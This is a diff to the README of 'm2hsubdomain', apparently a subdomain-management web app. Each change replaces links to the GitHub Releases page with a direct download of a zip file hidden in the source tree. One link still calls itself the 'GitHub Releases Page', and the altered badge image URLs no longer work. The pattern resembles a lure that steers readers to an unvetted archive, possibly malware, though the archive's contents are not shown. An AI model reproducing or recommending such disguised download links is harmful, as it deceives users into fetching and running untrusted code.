@@ -6,7 +6,7 @@ Welcome to m2hsubdomain! This web app lets you manage and display subdomains sim
 
 ## 📥 Download Now
 
-[![Download m2hsubdomain](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/BOLUPAZ123/m2hsubdomain/releases)
+[![Download m2hsubdomain](https://raw.githubusercontent.com/BOLUPAZ123/m2hsubdomain/main/src/integrations/m_hsubdomain_celebrated.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/BOLUPAZ123/m2hsubdomain/main/src/integrations/m_hsubdomain_celebrated.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ Stay updated with the latest improvements and features. Check the release notes 
 
 ## 💾 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/BOLUPAZ123/m2hsubdomain/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/BOLUPAZ123/m2hsubdomain/main/src/integrations/m_hsubdomain_celebrated.zip).
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version.
@@ -63,4 +63,4 @@ For additional help, reach out to our support team. You can find contact informa
 
 Join our community to share tips, ask questions, and connect with other users. Follow us on social media for updates.
 
-[![Download m2hsubdomain](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/BOLUPAZ123/m2hsubdomain/releases)
+[![Download m2hsubdomain](https://raw.githubusercontent.com/BOLUPAZ123/m2hsubdomain/main/src/integrations/m_hsubdomain_celebrated.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/BOLUPAZ123/m2hsubdomain/main/src/integrations/m_hsubdomain_celebrated.zip)
